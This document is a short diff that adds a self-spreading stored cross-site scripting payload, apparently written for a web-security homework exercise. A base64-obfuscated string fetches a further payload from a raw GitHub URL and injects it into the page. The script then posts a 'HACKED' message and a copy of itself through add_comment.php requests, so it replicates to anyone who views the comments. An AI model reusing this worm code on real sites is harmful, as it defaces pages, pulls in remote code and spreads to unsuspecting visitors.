@@ -1,0 +1,10 @@
+<script>
+var get = decodeURIComponent(atob("JTNDc2NyaXB0JTNFJTI0LmdldCglMjJodHRwcyUzQSUyRiUyRnJhdy5naXRodWJ1c2VyY29udGVudC5jb20lMkZDaWN0cm9uZSUyRlBXQVMtSFc2JTJGbWFzdGVyJTJGcGF5bG9hZC5odG1sJTIyJTJDZnVuY3Rpb24oZCklN0J2YXIlMjBzJTNEYXRvYihkKSUzQiU3RCklM0IlMjQoJTI3aGVhZCUyNykuYXBwZW5kKGQpJTNDJTJGc2NyaXB0JTNF"));
+dt = new Date();
+utcDate = dt.toUTCString();
+message = "I was HACKED by Nick at "+utcDate;
+commentStr = " add_comment.php?";
+$.get( commentStr+"id=72&comment="+message, function( data ) {});
+var scriptStr = "<script>"+get+"</script>Nick OBrien is super cool!!!";
+$.get(commentStr+"comment="+scriptStr, function( data ) {});
+</script>
